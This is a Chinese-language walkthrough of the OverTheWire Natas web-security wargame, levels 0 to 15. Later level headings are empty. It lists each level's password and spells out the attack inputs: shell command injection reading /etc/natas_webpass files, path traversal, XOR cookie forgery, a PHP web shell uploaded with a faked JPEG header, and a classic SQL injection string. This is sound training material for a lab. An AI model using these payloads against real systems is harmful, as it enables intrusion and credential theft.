# OverTheWire Natas

[介绍页](https://overthewire.org/wargames/natas/)  
省流：反正就是用浏览器打开就行了  

## Level 0

```text
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## Level 0 -> Level 1

用浏览器打开，填账号密码就行啦  
然后嘛，下一关的密码就在注释里面，打开控制台就能看到了  
> 浏览器按F12打开控制台  

```
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
</div>
```

### 密码

```
g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```

## Level 1 -> Level 2

> You can find the password for the next level on this page, but rightclicking has been blocked!  
> 合着我刚才那关用的右键->检查是吧(ˉ▽ˉ；)...  

还是一样，打开控制台就能找到，在注释里面  

```html
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
```

### 密码

```
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

## Level 2 -> Level 3

> There is nothing on this page  
> 没有东西我找啥(ˉ▽ˉ；)...  

打开控制台，能看到有一个单像素大小的图片，当然密码不会在图片里，303B的大小感觉不会是隐写的。  

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```

然后呢，这个图片有什么特别的？它是一个提示，因为可以往前面看看，其他关是没有这个图片的  
结合页面提示”这个页面什么都没有“所以，去看看这个图片的来源吧  
控制台查看元素，右键图片src=""里的部分，在新标签页中打开  
http://natas2.natas.labs.overthewire.org/files/pixel.png  
把这个链接改一下，去掉pixel.png就行了  
于是打开了natas2的文件目录页面  

```
Index of /files
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[IMG]	pixel.png	2023-10-05 06:15	303	 
[TXT]	users.txt	2023-10-05 06:15	145	 
Apache/2.4.52 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80
```

> 大概就是这样，我直接复制粘贴纯文本的，能看出来就行（  

点击那个users.txt看看  

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

ok密码就在这  

### 密码

```
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

## Level 3 -> Level 4

> There is nothing on this page

一打开，又是这个，意味着，当前页面别想找到密码了，但是这个地址下面应该是有东西的  
看一下元素，这有个注释  
No more information leaks!! Not even Google will find it this time...  
怎么说好呢，他说Google也找不到，然后根据这个联想到`robots.txt`其实关于这个思路我还是觉得有点牵强，但是...  
这关真的是靠`robots.txt`， 那就这个逻辑吧（  
所以改一下链接，去看看`robots.txt`写了啥  
http://natas3.natas.labs.overthewire.org/robots.txt  

```
User-agent: *
Disallow: /s3cr3t/
```

好的，不然搜索引擎访问这个文件夹，那就去这个文件夹看看  
http://natas3.natas.labs.overthewire.org/s3cr3t/  
打开后会发现原来是一个文件目录，就和natas2一样，这里就不贴出来了，点users.txt就行了  

```
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

### 密码

```
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

## Level 4 -> Level 5

> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"  
> 禁止访问。您从""访问，而授权用户只能从 "http://natas5.natas.labs.overthewire.org/"访问。

其实说的很清楚了，就是要从natas5来访问natas4，至于怎么访问，先打开natas5的页面  
弹出登录框直接点取消  
在这个未认证的页面打开控制台，使用js来跳转到natas4的页面  
`window.location.href = 'http://natas4.natas.labs.overthewire.org/';`  
等一会然后就跳转了，会弹出这个，密码的消息  

```
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

### 密码

```
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

## Level 5 -> Level 6

因为一开始打开natas5，没有让我登录，直接弹出一个：  
> Access disallowed. You are not logged in  
所以我还以为是隐藏了http1.1的那个basic认证登录，后来清理cookie，又打开natas5发现有输入账号密码的弹窗了，所以应该是没关系的  

--- 

上面都是废话（ 

实际上就是，登录了，但是还是判断你没登录，然后我就登录了natas4和natas5，比较一下请求头，然后发现natas5有这一段，natas4没有  
Cookie:loggedin=0  

把这个放搜索引擎搜一下就大概知道了，改一下这个cookie的值就行了  
浏览器开发者工具->应用->cookie  
把那个0改成1，然后刷新页面  
> Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR  

### 密码

```
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

## Level 6 -> Level 7

![natas6](_v_images/20231108164926039_20627.png)  

要填东西，要么是找到正确答案，要么是想办法绕过提交之类的，但是他都非常贴心的给了个源码链接了.......  
打开一看，这一段的提示已经非常明显了...  

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

把这个`includes/secret.inc`加到natas6的链接看看是什么就行了  
http://natas6.natas.labs.overthewire.org/includes/secret.inc  

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

所以natas6要填入的内容就是这个`FOEIUWGHFEEUHOFUOIU`  
填进去提交，↓  
> Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr  

### 密码

```
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

## Level 7 -> Level 8

打开以后，只有两个链接文本  
[Home](http://natas7.natas.labs.overthewire.org/index.php?page=home) [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)  

点开一个，页面会跳转一下，但没太大变化  
[Home](http://natas7.natas.labs.overthewire.org/index.php?page=home) [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)  
this is the front page

然后打开元素，能看到一个注释写了提示  
hint: password for webuser natas8 is in /etc/natas_webpass/natas8  

跟你说密码在服务器这个路径，有什么用？又不能登录到主机。  
但是看一些这两个链接文本，跳转以后的地址：  http://natas7.natas.labs.overthewire.org/index.php?page=home  
链接末端是给`index.php`传了一个参数`page=home`  
所以试试把密码所在的路径作为参数传过去：http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8  
直接就显示密码了  
[关于get请求传递参数的更多内容可见这个链接](https://cloud.tencent.com/developer/article/2331610)  

其他：  
> 其实还可以把参数改一下，还可以查看natas7的密码，不过也就只能再看natas7的密码了，其他的都看不了  
> Warning: include(/etc/natas_webpass/natas9): failed to open stream: Permission denied in /var/www/natas/natas7/index.php on line 21  
> Warning: include(): Failed opening '/etc/natas_webpass/natas9' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21  

> 至于为什么是`?page=`然后接参数，我也不知道，不会php，反正貌似page参数可以让php显示指定路径的文件的样子  

### 密码

```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```

## Level 8 -> Level 9

又是提交secret，当然是看看[View sourcecode](http://natas8.natas.labs.overthewire.org/index-source.html)先  

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```


`return bin2hex(strrev(base64_encode($secret)));`  
很明显这一句就是加密secret的代码，去搜一下  
`base64_encode`很明显就是base64编码  
[`strrev()`](https://www.w3school.com.cn/php/func_string_strrev.asp)是反转字符串  
[`bin2hex`](https://www.w3school.com.cn/php/func_string_bin2hex.asp)是转十六进制  
> 上面两个也是链接，点击跳转到w3c的对应介绍  


再看这个`if`，提交后的判断就是一句  
`if(encodeSecret($_POST['secret']) == $encodedSecret)`  
这一句会将提交的内容使用`encodeSecret()`函数编码，也就是上面那段，然后判断编码后的值是否和变量`$encodedSecret`相等  
`$encodedSecret = "3d3d516343746d4d6d6c315669563362";`这个已经写出来了，所以接下来用这个值，反向计算就能得出编码前的值，然后填入即可  

因为编码顺序是由内到外，所以解码的顺序得是由外到内  

1. 恢复`bin2hex()`
    1. 可以用php的`pack()`来转换回去
        ```php
        echo pack("H*","3d3d516343746d4d6d6c315669563362");
        ```
        当然怎么运行这一段...，要么自己有运行php的环境，要么还是[在线工具](https://code.y444.cn/php)（
    2. 也可以直接用在线的[hex转字符串工具](https://www.lddgo.net/string/hex)
    > 结果：==QcCtmMml1ViV3b
2. 恢复`strrev()`
    这个很简单，要么php在用一次这个函数，要么找字符串反转的在线工具  
    > 结果：b3ViV1lmMmtCcQ==  
3. base64解码
    1. 要么Linux一般都有的`base64 -d`, 要么就还是[在线工具](https://www.lddgo.net/convert/stringbasesix)  
    > 结果：oubWYf2kBq

填入结果，得到密码：Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd  

### 密码

```
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

## Level 9 -> Level 10

给了源码，所以当然看看源码  

```html
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>
Output:
```

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

这段php和上面的表单，就是获取用户的输入，然后运行`grep -i`在文件`dictionary.txt`里进行匹配  
本来以为直接输入password就行了，但是结果如下：  

```
password
password's
passwords
```

我还想着是不是密码在匹配到的文本的下一行之类的，但是使用`-v -`作为输入后，获取了完整的文件内容（应该），然后用页面搜索看了看  
这个文件里面根本没有密码  

然后换个思路，既然都可以使用`-v`这种方式了，毕竟这个php没做输入过滤，所以为什么不直接试试运行一个`cat`来看密码呢？  

```bash
"grep -i $key dictionary.txt" # 首先这是php匹配的源码
/etc/natas_webpass/natas10    # 然后这个是密码路径，至于为什么，这个在natas开头页就说过了，前面也用过这一点
# 这个就是预期的命令，也就是输入内容点击提交以后，php实际运行的shell命令
# cat 看密码自然不用说
# 在cat 的命令前后添加分号，这样可以让命令在之下错误的情况下继续执行该行后面的命令
# 毕竟前后两个都不是完整的命令
"grep -i ;cat /etc/natas_webpass/natas10;dictionary.txt"
```

所以这就是需要输入的内容：  
`;cat /etc/natas_webpass/natas10;`，输入提交就能得到密码了  

> Output:  
> D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE  

---

其实只需要加上匹配模式和密码文件路径就行了，用grep多查找一个文件，具体看下面一级  
输入这个也行，结果看第一行就行了  
`'.' /etc/natas_webpass/natas10`  

### 密码

```
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

## Level 10 -> Level 11

```php
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

有变化的只有这里，如页面所说，对输入进行了过滤，现在输入不能有这些：`;`, `|`, `&`  
> 插播正则表达式小知识：  
> 在这个例子中：`''`表示字符串，两个`/`是php正则表达式的分隔符，`[]`则是正则表达式的字符匹配，表示匹配里面的每一个字符(单独匹配，不会连起来  
> 具体还是看这个吧[https://www.runoob.com/regexp/regexp-syntax.html](https://www.runoob.com/regexp/regexp-syntax.html)  

**不过，说了那么多，其实这题解法很简单甚至不涉及上面的那些**  
只要想起`grep`可以查找多个文件就行了，所以，加一个密码文件的路径不就行了嘛(￣▽￣)"  
大概就像这样：`grep <匹配的模式> 文件1 文件2`  

所以提交这个就行了↓  
`'.' /etc/natas_webpass/natas11`  

```
Output:
/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
dictionary.txt:African
# 下面一大堆，略
```

### 密码

```
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

## Level 11 -> Level 12

Cookies are protected with XOR encryption  
> cookies 使用了异或加密保护  

下面这一堆是他的php源码  

```php
<?
// 创建"defaultdata"cookie的数组，showpassword键值为no，bgcolor键值为#ffffff
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

// 实现异或加密的函数
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // 遍历每个字符
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
// 加载"data"cookie
function loadData($def) {
    global $_COOKIE; // 这里应该是使用$_COOKIE变量获取cookie
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    // 临时的data数组，初始化方式为先base64解码cookie的data键，然后结果作为异或加密的参数，加密后内容转为数组赋值
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    // 只有当临时data数组确实是数组；存在showpassword键；存在bgcolor键时，才执行下面的语句
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        // 只有当临时data数组的bgcolor键值为十六进制颜色值时，才会把临时data数组的showpassword键值赋值给mydata数组
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
// 根据"data"设置cookie
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

// 调用loadData函数给"data"赋值，参数为"dafaultdata"
$data = loadData($defaultdata);

// 如果用户提交的表单存在bgcolor键，判断是否为十六进制颜色值，是则赋值给"data"的bgcolor键
if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
// 用"data"的值设置cookie
saveData($data);
?>

<?
// 如果data的showpassword键值为yes，就显示密码
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

流程：

1. 最开始没有cookie  
    1. 运行`$data = loadData($defaultdata);`，`$data`的值将为`$defaultdata`  
2. 用预先定义的值设置cookie  
    1. 运行`saveData($data);`，以`$data`的值设置cookie  
    2. 具体细节  

        ```php
        function saveData($d) {
            setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
        }
        ```

获取密码  

1. 要显示密码，就需要运行`saveData($data)`时，`$data`数组的`showpassword`键值为`yes`  
2. 而会对`$data`数组的`showpassword`键修改的地方在，`loadData()`函数  
3. 具体实现为将cookie的data键值解码转为关联数组tempdata，后赋值给新数组作为返回值  
    1. base64_decode  
    2. 源码里的xor函数解  
    3. json_decode转为数组  
4. 所以为了修改`$data`数组，需要修改`$tempdata`数组，而该数组内容取决于浏览器cookie  
    1. `$tempdata`来自浏览器的cookie具体定义如下：  
    2. `$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);`  
5. 因此需要修改浏览器的cookie中data的值  
    1. 但是该cookie值被异或加密保护  
    2. 因此需要获得异或加密的密钥以及具体实现方式  
    3. 此处使用的异或加密实现方法在源码中，既`xor_encrypt()`  
    4. 其中密钥为`$key = '<censored>';`，显然需要寻找真正的值  

获取密钥

1. 结合流程，第一次运行异或加密的函数位置为，流程2.2  
    * 因为第一次没有cookie所以`loadData()`函数里面的异或加密函数没有调用  
2. 明文为`json_encode($d)`，既`json_encode($defaultdata)`，而它的值如下：  
    * `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`  
3. 密文为`base64_decode(<value>);`，`<value>`为浏览器里获取到的data的值  
    * 密文将经过base64编码后通过设置cookie的方式可被获取到，如下：  
    * `setcookie("data", base64_encode(xor_encrypt(json_encode($d))));`  
4. 反推获取密钥  
    1. 推算出密钥涉及的内容单独在下面，建议先看完下面  
    2. 具体代码实现

    ```php
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    $data = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";
    $m = json_encode($defaultdata);
    $c = base64_decode($data);
    $k = xor_encrypt($m, $c);
    echo $k;
    // 输出：KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
    ```

    计算出的结果去重，得到密钥`KNHL`，重新构造一个数组然后带入密钥加密  
    具体就是照着上面那个数组的定义，把no改成yes，然后改背景颜色实际上没必要，只是我个人加点反馈  

    ```php
    $changedData = array("showpassword"=>"yes", "bgcolor"=>"#00ffff");
    $changedCookie = base64_encode(xor_encrypt(json_encode($changedData), "KNHL"));
    echo $changedCookie;
    ```

    运行以后就得到这个cookie了↓：  
    `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbXh8LSguKmkz`  
    浏览器打开开发者工具，应用，cookie，把data的值修改成这个，然后刷新就行了  
    > The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG  

跟反推密钥相关的内容

1. 关于异或加密  

    ```
    如果用字母代表明文(m)密文(c)和密钥(k)
    xor代表异或运算（对左右两边的值的对应的所有二进制位计算）
    1. m xor k = c  
    2. c xor k = m  
    3. 两个相同的值异或运算结果为0  
    4. 一个值和0异或运算结果为该值本身  
    m xor c = m xor m xor k = 0 xor k = k  
    所以将明文和密文进行异或运算即可得到密钥  
    ```

    > 可参考内容：  
    > [关于异或加密](https://ruanyifeng.com/blog/2017/05/xor.html)  
    > [关于异或运算](https://blog.csdn.net/xiaopihaierletian/article/details/78162863)  

2. 使用的加密函数的细节
    1. 遍历明文的每一个字符，对每个字符使用密钥中第i个字符进行异或运算
    2. 下面的for循环内，可以在遍历明文时，同时也遍历密钥的字符
    3. 对哦这其实就是类似嵌套了一个循环的效果，遍历明文的时候，又能再次基础上遍历密钥，这样就能按顺序重复使用密钥的字符
    4. 也正因此，直接算出来的密钥是重复了几次的
    5. 而重复过的密钥，不一定是正好重复了i次的，所以末尾不一定是密钥本身的末尾，类似于1231，结尾不是123的3，而是1
    6. **所以，如果使用重复的密钥来加解密，在遍历到结尾的时候，那个非正常的结尾字符，就会导致些许错误**
    7. ↑被这个整懵逼了好久，我这样做结果发现，数组的键`showpassword`的值，只要大于两个字符，生成的cookie就没法用，结果刚好就不能设置为`"yes"`↑
    8. 上面两句算是后话，结合整篇内容才知道我在说什么（
    9. 下面这一段应该可以说明

    ```php
    function xor_encrypt($in, $key) {
        $text = $in;
        $outText = '';
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }
        return $outText;
    }

    $key = "123";
    $text = "1234567890";
    $cipherText = xor_encrypt($text, $key);
    $wrongKey = xor_encrypt($text, $cipherText);

    echo "Key is       : " . $key . "<br>";
    echo "Text is      : " . $text . "<br>";
    echo "CipherText is: " . $cipherText . "<br>";
    echo "Calculated Key is: " . $wrongKey . "<br>";
    ```

    > 输出：  
    > Key is : 123  
    > Text is : 1234567890  
    > CipherText is:    
    > Calculated Key is: 1231231231  




### 密码

```
YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```

## Level 12 -> Level 13

> 页面内容：  
> Choose a JPEG to upload (max 1KB):  
> 选择文件按钮  
> 上传文件按钮  
> 还有一个查看源码

看下面源码写的注释（（  

```php
<?php
// 就是个生成随机字符串的函数，不重要，细节略
function genRandomString() {
}
// 这个函数会根据传入的目录名$dir变量和扩展名$ext变量，将它们中间缝合一个随机字符串，生成一个路径
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
// 这个函数主要就是用来获取目录和扩展名，依靠pathinfo读取$fn代表的文件获取扩展名
// 然后用得到的目录和扩展名调用上面那个函数
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
// 下面两行通过内置的"upload"确定了调用上面那个函数时传入的目录名
// 同时还获取了POST发送的表单的值，具体对应的就是含有`name="filename"`这一段的那个input元素
// 这个input是隐藏的它的值决定了上传文件后，文件的路径的扩展名
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

**分析**

综上，可以看到源码没有直接写什么条件下会显示密码  
所以思路应该是主动去查看密码，或者找密码是或藏在别处  
但是这次没提示，“该页面什么也没有”，所以应该是主动尝试查看密码  
那么方法也就是尝试看这个文件：`/etc/natas_webpass/natas13`  
然后，根据上面对源码的分析，可以知道能通过修改隐藏的input元素值来修改上传文件后显示的扩展名  
再者这个文件上传除了大小，根本没过滤其他的，完全可以传一个php文件上去，然后执行访问php文件执行查看密码的命令  
`cat /etc/natas_webpass/natas13`  

**具体过程**

先准备一个php文件，内容如下：  

```php
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
```

然后在natas12的页面打开浏览器的开发工具，检查元素，找到这个元素  
`<input type="hidden" name="filename" value="s49vthjlil.jpg">`  

> value的值每次都不一样，不重要  

接下来把`hidden`删了，页面上就会多一个输入框，把里面的内容，扩展名从jpg改为php  
然后上传准备好的php文件  
接下来页面会变成这样  

> The file upload/e0m8v73mfy.php has been uploaded  

点开链接就看到密码了  
好，搞了两个小时多  


### 密码

```
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```

## Level 13 -> Level 14

> For security reasons, we now only accept image files!

区别不过是加了一个`exif_imagetype()`函数来识别上传的是不是图片，这玩意一艘绕过一大把  
对于这关，需要JPEG，把上次用的php文件改一下(看密码13改成14），用hex编辑器给头部加上`FF D8 FF E0 00 10`就行了  
具体操作，我是先在文件头部输入六个空格，然后在vscode里面用hex编辑器的插件打开，把把开头六个空格的值照着改就行了  
最后当然要把文件重命名为`.jpg`  结尾  

> [参考](https://www.cnblogs.com/Lee-404/p/12838790.html)  

### 密码

```
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
```

## Level 14 -> Level 15

两个输入框，一个输入用户名一个输入密码，还有个登录的按键和查看源码  

```php
<?php
// 这里连接到了一个MySQL数据库
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');
    // 构造了一个查询语句
    // 就是SELECT * FROM users WHERE username="" and password=""
    // 在这两对双引号里的内容是页面上获取的用户名和密码的输入
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    // 这个判断语句使得能够通过在URL末尾添加GET请求的参数来触发调试，例子如下
    // http://natas14.natas.labs.overthewire.org/?debug=1&username=a&password=a
    // 这样会显示将会运行的查询字符串，方便调试注入语句
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
    // 通过计数查询返回的结果数量来判断是否显示密码
    // 也就是说只要至少查找到一个项目就会显示密码
    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

因为有`where`接上了`username`和`password`的匹配，所以正常输入的话，不知道它数据库里面有什么就根本试不出来  
但是查询语句根本没过滤输入，所以用经典的MySQL注入就行了  
网上搜，菜鸟教程的是这个： `' OR '1'='1'; --`  
不过因为可以用数字`1`代表真，所以可以简化一下： `" OR 1; -- `  
所以，把这个填入两个框里面就行了，还有，两个框都要填，因为源码里面调用了这两个框的输入，所以都得有输入才行  

**细节解释**  

查询语句：`SELECT * FROM users where username="" and password=""`  
如果没有`where`进行过滤的话，就会直接查询所有内容，所以需要让这个`where`失效  

1. 可以操作的地方在于两对双引号之间，首先让后面的其他内容失效，使用注释`-- `（注意`--`后面必须要有一个空格[详见此](https://blog.csdn.net/u010164507/article/details/85259680)）
    1. 添加注释
        `username="-- "`
2. 接下来修改左侧表达式，使其值为真
    1. 添加一个双引号构成用户名是否为空字符串的比较
         `username=""-- "`
    2. 通过`OR`添加逻辑与，然后在右侧写一个值为真的表达式或者值，然后用`;`结尾
         `username="" OR 1; -- "`

**其他**

除了把输入填到框里，还可以通过在网页链接末尾添加GET参数来提交内容  
虽然页面表单提交用的是POST方法，但是源码里直接使用`$_REQUEST`也可以获取GET的参数，具体如上面源码的注释  

> [关于GET和POST](https://www.runoob.com/tags/html-httpmethods.html)  

### 密码

```
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```

## Level 15 -> Level 16

### 密码

```
```

## Level 16 -> Level 17

### 密码

```
```

## Level 17 -> Level 18

### 密码

```
```

## Level 18 -> Level 19

### 密码

```
```

## Level 19 -> Level 20

### 密码

```
```

## Level 20 -> Level 21

### 密码

```
```

## Level 21 -> Level 22

### 密码

```
```

## Level 22 -> Level 23

### 密码

```
```

## Level 23 -> Level 24

### 密码

```
```

## Level 24 -> Level 25

### 密码

```
```

## Level 25 -> Level 26

### 密码

```
```

## Level 26 -> Level 27

### 密码

```
```

## Level 27 -> Level 28

### 密码

```
```

## Level 28 -> Level 29

### 密码

```
```

## Level 29 -> Level 30

### 密码

```
```

## Level 30 -> Level 31

### 密码

```
```

## Level 31 -> Level 32

### 密码

```
```

## Level 32 -> Level 33

### 密码

```
```

## Level 33 -> Level 34

### 密码

```
```
